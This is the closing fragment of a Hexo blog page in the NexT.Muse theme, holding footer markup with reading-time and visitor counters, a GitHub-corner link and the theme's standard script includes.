      <span>Reading time total &asymp;</span>
    <span title="Reading time total">39:49</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
